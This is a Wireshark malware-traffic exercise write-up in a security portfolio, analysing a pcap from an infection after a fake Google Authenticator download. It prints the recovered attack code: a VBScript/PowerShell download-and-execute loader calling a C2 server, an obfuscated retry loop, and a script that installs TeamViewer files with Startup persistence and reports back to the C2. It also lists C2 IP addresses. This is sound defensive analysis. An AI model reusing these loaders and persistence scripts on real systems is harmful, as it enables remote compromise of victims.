## TRAFFIC ANALYSIS EXERCISE: DOWNLOAD FROM FAKE SOFTWARE SITE 
*[Link to exercise](https://www.malware-traffic-analysis.net/2025/01/22/index.html)*

**Contents:**
 - [Description](https://github.com/sapan322/Raman-Cybersecurity-Portfolio/blob/main/Wireshark/Detecting%20and%20Investigating%20Malware%20Traffic.md#description)
 - 

## Description
This exercise involves using Wireshark to detect and investigate malware traffic. The goal is to identify malicious network behavior, protect networks, and respond effectively to security incidents.

### Exercise details:

```
**BACKGROUND:**

You work as an analyst at a Security Operation Center (SOC). Someone contacts your team to report a coworker has downloaded a suspicious file after searching for Google Authenticator. The caller provides some information similar to social media posts at:

*https://www.linkedin.com/posts/unit42_2025-01-22-wednesday-a-malicious-ad-led-activity-7288213662329192450-ky3V/*

*https://x.com/Unit42_Intel/status/1882448037030584611*

Based on the caller's initial information, you confirm there was an infection.  You retrieve a packet capture (pcap) of the associated traffic.  Reviewing the traffic, you find several indicators matching details from a Github page referenced in the above social media posts.  After confirming an infection happened, you begin writing an incident report.


**LAN SEGMENT DETAILS FROM THE PCAP**

- LAN segment range:  10.1.17[.]0/24   (10.1.17[.]0 through 10.1.17[.]255)
- Domain:  bluemoontuesday[.]com
- Active Directory (AD) domain controller:  10.1.17[.]2 - WIN-GSH54QLW48D
- AD environment name:  BLUEMOONTUESDAY
- LAN segment gateway:  10.1.17[.]1
- LAN segment broadcast address:  10.1.17[.]255
 
**TASK**

For this exercise, answer the following questions for your incident report:
- What is the IP address of the infected Windows client?
- What is the mac address of the infected Windows client?
- What is the host name of the infected Windows client?
- What is the user account name from the infected Windows client?
- What is the likely domain name for the fake Google Authenticator page?
- What are the IP addresses used for C2 servers for this infection?

```

### Preparation:
- Download the PCAP file and open it in Wireshark.
- Review the summary information from the Background section:
  - A coworker downloaded a suspicious file from a fake "Microsoft Teams App" promoted via a malicious Google ad.
  - The malware was delivered by an HTTP C2 server at 5.252.153[.]241.

## System Infection Process Analysis (Incident Report):

1. Filter traffic by "C2 ip address" source/destination:
   
   `ip.src == 5.252.153.241 || ip.dst == 5.252.153.241`
   
   ![2025-02-20 14_41_46-Window](https://github.com/user-attachments/assets/f99aa56d-cc4c-48d1-adb7-f6e65d2c8a14)

2. Packet `No. 5028` initiates communication with the C2 server, starting the `TCP 3-Way Handshake`.

   ![2025-02-20 14_43_24-Window](https://github.com/user-attachments/assets/df18d19d-3689-4954-b628-ed38282b1c93)

3. Packet `No. 5031` contains an HTTP GET request: `/api/file/get-file/264872 HTTP/1.1`

   ![2025-02-20 14_47_35-Window](https://github.com/user-attachments/assets/b3f188a8-b72a-4ae1-975f-d516636adf60)

4. Packet `No. 5033` is an `HTTP 200 OK` response to packet `No. 5031`, containing a malicious script that:
    - Ignore errors
    - Create "Wscript.Shell"
    - Run a hidden powershell-command `cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command`
    - Executes a command (iex) to download another malicious script from:
         `http://5.252.153.241:80/api/file/get-file/29842.ps1` 
   
   ![2025-02-20 14_48_40-proxmox - Proxmox Virtual Environment](https://github.com/user-attachments/assets/b8a68ae3-5d05-4e2a-95dd-192490cbae73)

```
<component>
<script language="VBScript">

On Error Resume Next
Set objShell = CreateObject("Wscript.Shell")
objShell.Run("cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command ""start-process 'https://azure.microsoft.com'; iex (new-object System.Net.WebClient).'DownloadString'('http://5.252.153.241:80/api/file/get-file/29842.ps1');#URL: https://teams.microsoft.com""")

</script>
</component>
```

5. The user executes the script, and the machine sends another `HTTP GET` request to the server, which responds with an obfuscated PowerShell script:

   ![2025-02-20 14_52_02-Window](https://github.com/user-attachments/assets/2cd5ccab-c5ab-4f23-a1ed-635c320d0465)

```
I>C;B;0>c;n}k}g>e>w}o;g;I>C;A>g>I>C;A>g}I>C;R>y;Z}X>N>1}b>H}Q>9}J>H;M}u;R;G>9>3}b}m}x>v>Y}W>R}T}d}H}J}p}b}m}c}o>J>H}V}y;b;C;k;K}I>C>A>g>I;H;0;K>I;C}A}g}I;G}N}h;d>G}N>o}I>H;s;K;I>C;A}g;I}C;A;g>I>C;B>T}d}G>F;y}d}C}1}T;b;G}V}l;c}C}A;t}c}y;A}1;C;i>A>g}I;C;A;g;I>C>A}g}Y;2}9>u>d}G;l;u}d;W;U}K>I}C>A}g;I>H>0}K}I;C>A;g;I>E>l}u;d;m;9>r>Z;S}1;F>e}H;B;y}Z}X;N>z>a;W}9>u>I>C;R;y>Z>X;N;1}b}H;Q}K}I>C;A}g;I;F}N}0}Y>X;J;0>L>V>N}s}Z}W}V>w}I}C;1>z>I}D;U;K>f;Q}o;=>'.replace('}','').replace(';','').replace('>',''))))
```

Deobfuscated script:
   - Attempts to download malicious code from a URL.
   - If successful, runs the code using IEX and restarts the script.
   - If unsuccessful, pauses for 5 seconds and restarts the script.

```
$result=$s.DownloadString($url)
}
catch {
    Start-Sleep -s 5
    continue
}
Invoke-Expression $result
Start-Sleep -s 5
}
```

6. After that infected machine sends an `HTTP GET` request every 5 seconds to the malicious URL, but the server responds with a `404 Not Found` code.

   ![2025-02-20 14_54_59-Window](https://github.com/user-attachments/assets/86beebe7-d2ea-4d4d-bc3d-edf6a54ae76c)

7. After 1 minute, the HTTP server responds with another code malicious. The system executes the code, and the attacker establishes persistence on the infected machine using a Remote Access Trojan (RAT) or backdoor:
   
   - Download files `TeamViewer.exe` `Teamviewer_Resource_fr.dll` `TV.dll` `pas.ps1` from `<panelIP>` to the created folder `C:\ProgramData\huo`.
   - Saves the path to `TeamViewer.exe` in a variable.
   - Creates a shortcut for `TeamViewer.exe`.
   - Send logs to the malicious server

```
function Download-Files($panelIP, $files, $filesDir){
    $web = New-Object System.Net.WebClient
    
    try {
        if(!(Test-Path $filesDir)) {
            New-Item $filesDir -ItemType Directory | Out-Null
        }
    } catch {
        return @{'status' = 'error'; 'message' = 'error while creating startup directory'}
    }
    
    foreach($file in $files) {
        try {
            $link = $file.link
            $fileName = $file.name
            $filePath = "$filesDir\$($file.name)"
            $web.DownloadFile($link, $filePath)
            if($fileName -eq $startupFile){
                $exePath = $startupFile
            }
        } catch {
            return @{'status' = 'error'; 'message' = "Error while download file. Filename: $($file.name). Link: $($link). Error: $($Error[0].exception.message)"}
        }
    }

    return @{'status' = 'success'}
}

function Create-Shortcut($filePath, $shortCutpath){
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($shortCutpath)
    $Shortcut.TargetPath = $filePath
    $Shortcut.Save()
}

function Invoke-Startup($panelIP, $files, $filesDir, $startupFileName){
    $result = Download-Files $panelIP $files $filesDir
    if ($result.status -eq 'error'){
        return $result
    }

    #$startupFilePath = "$filesDir\$startupFileName"
    $startupFilePath = "C:\ProgramData\huo\TeamViewer.exe"
    $shortcutPath = "$([Environment]::GetFolderPath('Startup'))\TeamViewer.lnk"

    try {
        Create-Shortcut $startupFilePath $shortcutPath
    } catch {
        return @{'status' = 'error'; 'message' = "Error while creating shortcut."}
    }

    return @{'status' = 'success'; 'message' = 'startup shortcut created'}
}

function Send-Log($result){
    $log = "?k=$result"
    $uploadUrl = $url + $log
    $web = New-Object System.Net.WebClient
    $web.DownloadString($uploadUrl)
}

function ConvertTo-StringData($hashTable){
        foreach ($item in $hashTable) {
            foreach ($entry in $item.GetEnumerator()) {
                "{0} = {1}; " -f $entry.Key, $entry.Value
            }
        }
}

$filesDownloadLink = $ip + 'api/file/get-file/'
$filesDir = 'C:\ProgramData\huo'
$files = @(
    @{'name' = 'TeamViewer.exe'; 'link' = $filesDownloadLink + 'TeamViewer'},
    @{'name' = 'Teamviewer_Resource_fr.dll'; 'link' = $filesDownloadLink + 'Teamviewer_Resource_fr'},
    @{'name' = 'TV.dll'; 'link' = $filesDownloadLink + 'TV'}
    @{'name' = 'pas.ps1'; 'link' = $filesDownloadLink + 'pas.ps1'}
)
$startupFile = 'TeamViewer.exe'

$result = Invoke-Startup $panelIP $files $filesDir $startupFile
$result = ConvertTo-StringData($result)
Send-Log($result)
```

8. The infected machine downloads and executes all files. One of the files, pas.ps1, is a PowerShell script that:

   - Cleans the code from noise symbols (;, }, >)
   - Decodes the code from Base64.
 
 ![2025-02-20 15_40_58-Window](https://github.com/user-attachments/assets/44868eb5-83af-4ea4-ab73-0f7930446aa2)

```
# Malicious code
iex ([system.text.encoding]::UTF8.GetString([system.convert]::('F#r[o;m;B[a[s#e#6#4[S;t;r[i;n#g['.replace('#','').replace(';','').replace('[',''))('J;G;Z;z>b;y;A}9;I}E;5;l;d;y>1;P}Y>m}p}l;Y;3>Q}g}L>U;N;v>b}S>A;i}U}2;N}y}a}X>B>0;a}W}5>n>L;k>Z>p;b;G>V}T>e}X}N;0}Z>W}1}P;Y;m;p>l>Y}3;Q;i>C;i;R>T>Z>X>J}p>Y>W>x>O;d;W}1}i>Z}X>I;g}P;S;A}k}Z>n;N>v;L}k;d;l;d}E}R}y>a;X;Z>l;K>C}J}j;O}l}w;i>K}S>5>T}Z;X>J}p>Y;W;x;O;d}W>1}i}Z;X}I}K>J;F}N;l}c>m;l;h;b}E}5>1;b}W;J}l>c;i>A;9>I}C;J>7}M}D}p;Y}f}S}I}g>L>W;Y}g;J>F>N>l}c}m}l>h;b>E>5}1;b>W;J;l;c;g}o;k}U;2}V;y>a>W}F>s}T}n;V}t}Y}m;V;y}I}D;0;g>W}2>N;v>b}n>Z>l;c>n>R>d;O>j;p}0;b>2>l}u>d;D}Y}0;K}C}R}T>Z>X}J>p>Y>W;x>O>d;W>1}i}Z;X;I}s}M}T}Y>p>C}i}R;z}Z;X}J}p;Y;W>w}g;P;S>A>k>U;2>V>y}a;W>F>s}T;n;V}t}Y}m>V}y}C>i}R;p}c>C}A}9>I;C;d}o>d}H}R}w}O}i>8>v>N}S>4>y>N>T}I>u;M}T;U;z>L;j;I}0;M}S>8;n}C}i>R;1>c>m}w>g;P}S;A;k}a;X>A}r;J}H}N>l}c;m>l;h}b>A>o>k}c}y>A}9;I}E;5>l;d;y}1>P>Y>m;p}l>Y}3}Q}g;U;3;l;z>d>G;V}t}L}k;5}l>d>C;5>X}Z>W;J}D}b}G;l}l;b}n;Q}K}d>2;h}p;b;G}U;g>K>C}R;0}c;n>V>l}K}S>B;7}C}i>A>g;I>C;B;0>c;n}k}g>e>w}o;g;I>C;A>g>I>C;A>g}I>C;R>y;Z}X>N>1}b>H}Q>9}J>H;M}u;R;G>9>3}b}m}x>v>Y}W>R}T}d}H}J}p}b}m}c}o>J>H}V}y;b;C;k;K}I>C>A>g>I;H;0;K>I;C}A}g}I;G}N}h;d>G}N>o}I>H;s;K;I>C;A}g;I}C;A;g>I>C;B>T}d}G>F;y}d}C}1}T;b;G}V}l;c}C}A;t}c}y;A}1;C;i>A>g}I;C;A;g;I>C>A}g}Y;2}9>u>d}G;l;u}d;W;U}K>I}C>A}g;I>H>0}K}I;C>A;g;I>E>l}u;d;m;9>r>Z;S}1;F>e}H;B;y}Z}X;N>z>a;W}9>u>I>C;R;y>Z>X;N;1}b}H;Q}K}I>C;A}g;I;F}N}0}Y>X;J;0>L>V>N}s}Z}W}V>w}I}C;1>z>I}D;U;K>f;Q}o;=>'.replace('}','').replace(';','').replace('>',''))))
```

9. After the files are downloaded and the code is executed, the infected system sends an `HTTP GET request` with the message `startup shortcut created status success`.

   ![2025-02-20 15_42_47-Window](https://github.com/user-attachments/assets/219ffa46-8a79-4b0f-8a40-f4b6be76c907)

  Shortly after, another `HTTP GET request` is sent with the message `script status: Process started`.

   ![2025-02-20 15_45_28-Window](https://github.com/user-attachments/assets/51ae5bb7-18f7-407e-9016-e2baed46f76b)

10. The infected system initiates a `TCP 3-Way Handshake` with `45.125.66.32`, an IP address that has been reported 480 times on AbuseIPDB.

   ![2025-02-20 18_57_40-Window](https://github.com/user-attachments/assets/e90743d0-d36c-4739-a48f-c36d6611e868)

11. After the handshake, the system encrypts communication with the C2 server using a public key from a self-signed certificate provided by the C2 server.

   ![2025-02-20 19_07_27-Window](https://github.com/user-attachments/assets/d020b6a8-18ab-41f9-b4c8-bcc4135ba90a)

12. Filtering packets by tls.handshake.type == 11 reveals another TLS handshake with  a third C2 server with self-signed certificate at 45.125.66.252, which also has reports on AbuseIPDB.

   ![2025-02-20 19_30_35-Window](https://github.com/user-attachments/assets/7dc26927-59a0-4378-93c3-bd736763ea52)



## Answers to questions:

- What is the IP address of the infected Windows client?
  
   `10.1.17.215`  is the **IP address** of the client that downloaded the PowerShell script, initiating the infection process.
  
- What is the mac address of the infected Windows client?

   `00:d0:b7:26:4a:74` is the **MAC address** of the infected Windows client.
  
- What is the host name of the infected Windows client?

   `DESKTOP-L8C5GSJ` is the **hostname**, as identified from the NBNS protocol.

   ![2025-02-20 16_33_18-Window](https://github.com/user-attachments/assets/70c83f1f-4369-46a6-94aa-955ea78fd550)

- What is the user account name from the infected Windows client?
 
   Packet `No. 250` contain **user account** name `shutchenson` (filter packets by `kerberos.CNameString`)

   ![2025-02-20 16_42_10-proxmox - Proxmox Virtual Environment](https://github.com/user-attachments/assets/722116b1-84ae-4261-8039-107f8a12d246)

- What is the likely domain name for the fake Google Authenticator page?

   `google-authenticator.burleson-appliance.net` (Google ad Web page)
  
   `authenticator.org` (fake Google Authenticator page)

  ![2025-02-20 17_00_37-Window](https://github.com/user-attachments/assets/e3a8e884-e9d4-4bb9-9f1d-0fd20122ac32)

- What are the IP addresses used for C2 servers for this infection?

   - `5.252.153.241` 
   - `45.125.66.32` 
   - `45.125.66.252` 

  ## Lessons learned:
  This traffic analysis exercise provided valuable insights and experience, including:
     - Using Wireshark for Incident Reporting: Gained hands-on experience in documenting incidents using Wireshark.
     
     - Traffic Filtering: Learned how to filter traffic to identify critical evidence in malware-related network activity.
     
     - Understanding Infection Risks: Recognized how easily systems can be compromised through malicious downloads.
     
     - Identifying C2 Servers: Developed skills in detecting malicious connections to Command and Control (C2) servers.
     
     - Deobfuscating Code: Practiced reading and interpreting obfuscated scripts.
     
     - Extracting Host Information: Learned how to extract hostnames and user account names from network traffic.
     
     - DNS Analysis: Gained experience in sorting DNS requests to identify malicious domains.
     
     - Using AbuseIPDB: Utilized AbuseIPDB to filter and identify malicious IP addresses.





   
